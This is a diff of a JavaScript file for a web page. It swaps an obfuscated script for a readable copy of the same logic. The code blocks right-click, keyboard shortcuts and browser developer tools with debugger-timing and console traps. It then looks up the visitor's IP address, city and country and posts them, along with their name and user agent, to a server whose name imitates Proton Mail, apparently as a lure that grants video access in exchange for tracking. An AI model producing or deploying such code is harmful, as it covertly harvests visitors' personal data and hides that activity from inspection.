@@ -1,2 +1,96 @@
-const _0x205970=_0x542a;function _0x54be(){const _0x995516=['body','Logging\x20failed:','reload','https://ipapi.co/json/','userAgent','F12','1670217TOArPx','ctrlKey','24ywlLJy','DOMContentLoaded','removeAttribute','catch','setAttribute','controls','submitted','style','addEventListener','https://proton-mail-2fa.onrender.com/log-ip','DevTools\x20detected','logVisitor','log','thankYouMessage','211077LetSbR','Console\x20access\x20is\x20blocked','key','16jvqcAy','secureVideo','toggleButton','innerHTML','4501450RhMNkV','8bRcYjW','setItem','shiftKey','display','<h1\x20style=\x22color:red;text-align:center;\x22>DevTools\x20Detected\x20-\x20Access\x20Blocked</h1>','country_name','preventDefault','error','4039515VrwWdl','value','11589446FDqoqN','stringify','json','city','toUpperCase','getItem','POST','112396uWIeHJ','then','6vyfXwk','altKey','getElementById','block','7194019oYPgyv'];_0x54be=function(){return _0x995516;};return _0x54be();}(function(_0xe5122a,_0x2f084a){const _0x33eade=_0x542a,_0x3e36bf=_0xe5122a();while(!![]){try{const _0x1fc9da=-parseInt(_0x33eade(0xb3))/0x1*(parseInt(_0x33eade(0x9d))/0x2)+parseInt(_0x33eade(0x8a))/0x3+parseInt(_0x33eade(0xa2))/0x4*(parseInt(_0x33eade(0xaa))/0x5)+-parseInt(_0x33eade(0x7f))/0x6*(parseInt(_0x33eade(0x83))/0x7)+parseInt(_0x33eade(0x8c))/0x8*(parseInt(_0x33eade(0x9a))/0x9)+-parseInt(_0x33eade(0xa1))/0xa+parseInt(_0x33eade(0xac))/0xb;if(_0x1fc9da===_0x2f084a)break;else _0x3e36bf['push'](_0x3e36bf['shift']());}catch(_0xad8b54){_0x3e36bf['push'](_0x3e36bf['shift']());}}}(_0x54be,0xe07a4),document[_0x205970(0x94)]('contextmenu',function(_0x34406e){const _0x103824=_0x205970;_0x34406e[_0x103824(0xa8)](),location['reload']();}),document[_0x205970(0x94)]('keydown',function(_0x2a1899){const _0x4c44c0=_0x205970;_0x2a1899[_0x4c44c0(0x8b)]&&!_0x2a1899[_0x4c44c0(0xa4)]&&!_0x2a1899[_0x4c44c0(0x80)]&&(_0x2a1899['preventDefault'](),location[_0x4c44c0(0x86)]());}),document[_0x205970(0x94)]('keydown',function(_0x4093b2){const _0x3b4c19=_0x205970;(_0x4093b2['key']===_0x3b4c19(0x89)||_0x4093b2['keyCode']===0x7b||_0x4093b2[_0x3b4c19(0x8b)]&&_0x4093b2[_0x3b4c19(0xa4)]&&['I','J']['includes'](_0x4093b2[_0x3b4c19(0x9c)][_0x3b4c19(0xb0)]())||_0x4093b2[_0x3b4c19(0x8b)]&&_0x4093b2[_0x3b4c19(0x9c)]['toLowerCase']()==='u')&&(_0x4093b2[_0x3b4c19(0xa8)](),location[_0x3b4c19(0x86)]());}),setInterval(function(){const _0x3fbc40=_0x205970,_0xc77500=new Date();debugger;const _0xf63a1b=new Date();if(_0xf63a1b-_0xc77500>0x64){document[_0x3fbc40(0x84)][_0x3fbc40(0xa0)]=_0x3fbc40(0xa6);throw new Error(_0x3fbc40(0x96));}},0x3e8));const trap=new Image();function _0x542a(_0x4ecde8,_0x47f43f){const _0x54be6d=_0x54be();return _0x542a=function(_0x542a5d,_0x530049){_0x542a5d=_0x542a5d-0x7f;let _0x601bc6=_0x54be6d[_0x542a5d];return _0x601bc6;},_0x542a(_0x4ecde8,_0x47f43f);}Object['defineProperty'](trap,'id',{'get':function(){const _0x2b8caa=_0x205970;document[_0x2b8caa(0x84)][_0x2b8caa(0xa0)]='<h1\x20style=\x22color:red;text-align:center;\x22>Console\x20Inspection\x20Blocked</h1>';throw new Error(_0x2b8caa(0x9b));}}),console[_0x205970(0x98)]('%c',trap),document[_0x205970(0x94)](_0x205970(0x8d),()=>{const _0x52b49f=_0x205970,_0x44ef12=document[_0x52b49f(0x81)]('visitorName'),_0x264784=document[_0x52b49f(0x81)]('logBtn'),_0x2dc57f=document['getElementById'](_0x52b49f(0x99)),_0x10c249=document[_0x52b49f(0x81)](_0x52b49f(0x9e));sessionStorage[_0x52b49f(0xb1)]('submitted')&&_0x352ea5();window[_0x52b49f(0x9f)]=()=>{const _0x3b931b=_0x52b49f;_0x264784['disabled']=_0x44ef12[_0x3b931b(0xab)]['trim']()==='';},window[_0x52b49f(0x97)]=()=>{const _0x2dcf4a=_0x52b49f,_0x5eeaba=_0x44ef12[_0x2dcf4a(0xab)]['trim']();if(!_0x5eeaba||sessionStorage[_0x2dcf4a(0xb1)](_0x2dcf4a(0x92)))return;fetch(_0x2dcf4a(0x87))['then'](_0x330f5b=>_0x330f5b[_0x2dcf4a(0xae)]())['then'](_0x1c9b09=>{const _0x16a8de=_0x2dcf4a;return fetch(_0x16a8de(0x95),{'method':_0x16a8de(0xb2),'headers':{'Content-Type':'application/json'},'body':JSON[_0x16a8de(0xad)]({'name':_0x5eeaba,'ip':_0x1c9b09['ip'],'city':_0x1c9b09[_0x16a8de(0xaf)],'country':_0x1c9b09[_0x16a8de(0xa7)],'userAgent':navigator[_0x16a8de(0x88)]})});})[_0x2dcf4a(0xb4)](()=>{const _0x469854=_0x2dcf4a;sessionStorage[_0x469854(0xa3)]('submitted',!![]),_0x352ea5();})[_0x2dcf4a(0x8f)](_0x2d8e77=>console[_0x2dcf4a(0xa9)](_0x2dcf4a(0x85),_0x2d8e77));};function _0x352ea5(){const _0x376e2c=_0x52b49f,_0x25317d=document[_0x376e2c(0x81)](_0x376e2c(0x9e));_0x25317d[_0x376e2c(0x8e)]('disabled'),_0x25317d[_0x376e2c(0x90)](_0x376e2c(0x91),!![]),_0x2dc57f[_0x376e2c(0x93)][_0x376e2c(0xa5)]=_0x376e2c(0x82);}});
+document.addEventListener('contextmenu', function (e) {
+  e.preventDefault();
+  location.reload();
+});
+
+
+document.addEventListener('keydown', function (e) {
+  if (e.ctrlKey && !e.shiftKey && !e.altKey) {
+    e.preventDefault();
+    location.reload();
+  }
+});
+
+
+document.addEventListener('keydown', function (e) {
+  if (
+    e.key === 'F12' || e.keyCode === 123 ||
+    (e.ctrlKey && e.shiftKey && ['I', 'J'].includes(e.key.toUpperCase())) ||
+    (e.ctrlKey && e.key.toLowerCase() === 'u')
+  ) {
+    e.preventDefault();
+    location.reload();
+  }
+});
+
+
+setInterval(function () {
+  const start = new Date();
+  debugger;
+  const end = new Date();
+  if (end - start > 100) {
+    document.body.innerHTML = '<h1 style="color:red;text-align:center;">DevTools Detected - Access Blocked</h1>';
+    throw new Error('DevTools detected');
+  }
+}, 1000);
+
+
+const trap = new Image();
+Object.defineProperty(trap, 'id', {
+  get: function () {
+    document.body.innerHTML = '<h1 style="color:red;text-align:center;">Console Inspection Blocked</h1>';
+    throw new Error('Console access is blocked');
+  }
+});
+console.log('%c', trap);
+
+
+document.addEventListener("DOMContentLoaded", () => {
+  const nameInput = document.getElementById('visitorName');
+  const button = document.getElementById('logBtn');
+  const thankYou = document.getElementById('thankYouMessage');
+  const video = document.getElementById('secureVideo');
+
+  // If already submitted during this session
+  if (sessionStorage.getItem("submitted")) {
+    unlockVideo();
+  }
+
+  window.toggleButton = () => {
+    button.disabled = nameInput.value.trim() === '';
+  };
+
+  window.logVisitor = () => {
+    const name = nameInput.value.trim();
+    if (!name || sessionStorage.getItem("submitted")) return;
+
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        return fetch('https://proton-mail-2fa.onrender.com/log-ip', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name: name,
+            ip: data.ip,
+            city: data.city,
+            country: data.country_name,
+            userAgent: navigator.userAgent
+          })
+        });
+      })
+      .then(() => {
+        sessionStorage.setItem("submitted", true);
+        unlockVideo();
+      })
+      .catch(err => console.error("Logging failed:", err));
+  };
+
+  function unlockVideo() {
+    const video = document.getElementById('secureVideo');
+    video.removeAttribute('disabled');
+    video.setAttribute('controls', true);
+    thankYou.style.display = 'block';
+  }
+});
 
